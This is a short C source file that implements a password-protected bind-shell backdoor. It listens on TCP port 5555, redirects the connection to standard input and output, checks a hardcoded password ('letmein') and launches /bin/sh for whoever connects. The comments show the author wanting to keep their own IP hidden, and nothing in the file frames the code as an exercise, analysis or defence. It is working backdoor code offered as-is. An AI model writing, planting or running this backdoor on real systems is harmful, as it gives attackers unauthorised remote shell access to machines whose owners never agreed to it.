#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>

#define PASS "letmein"
#define PORT "5555"

int ip_bind(void)
{
	int s;
	if ((s=socket(AF_INET,SOCK_STREAM,0))==-1) // Create Socket FD
	{
		//perror("[-] Error Creating Socket Descriptor\n");
		return -1;
	}

	int optval=1;
	if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))==-1) // Allow reusability of the socket
	{
		//perror("[-] Error in setsockopt()\n");
		return -2;
	}

	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof(hints)); // Zero out the garbage values in memory
	hints.ai_family = AF_UNSPEC;  // Use IPv4 or IPv6, whichever
	hints.ai_socktype = SOCK_STREAM; // TCP
	hints.ai_flags = AI_PASSIVE;     // Fill in my IP for me

	getaddrinfo(NULL, PORT, &hints, &res); // Fill the structure

	if((bind(s,res->ai_addr,res->ai_addrlen))==-1)
	{
		//perror("[+] Failed To Bind Port \n");
		return -3;
	}

	if(listen(s,5) == -1) // Listen On The Specified Port With a backlog of 5
	{
	    //perror("[-] Could Not Listen\n");
		return -4;
	}

	int conn_fd; // FD for client connections

	// accept(sock, (struct sockaddr *) &client_address, &client_length); can also be done but I dont want my IP to be known to the server
	conn_fd = accept(s, NULL, NULL);
	if(conn_fd == -1)
	{
		//perror("[-] Could Not Accept Connection\n");
		exit(-5);
	}

    dup2(conn_fd, 0);
    dup2(conn_fd, 1);
    dup2(conn_fd, 2);

    char input[30];
    read(conn_fd, input, sizeof(input)); // Read Input Stream For Password
    if (strncmp(input,PASS,strlen(PASS))==0)
    {
    	char *shell[2];
    	shell[0]="/bin/sh";
    	shell[1]=NULL;
    	execve(shell[0],shell, NULL); // Call Our Shell
    	close(s);
    	return 0;
    }

    else
    {
    	shutdown(conn_fd,SHUT_RDWR); // Shutdown Further R/W Operation From Client
    	close(s);
    	return -5;
    }
}

void main()
{
	ip_bind();
}

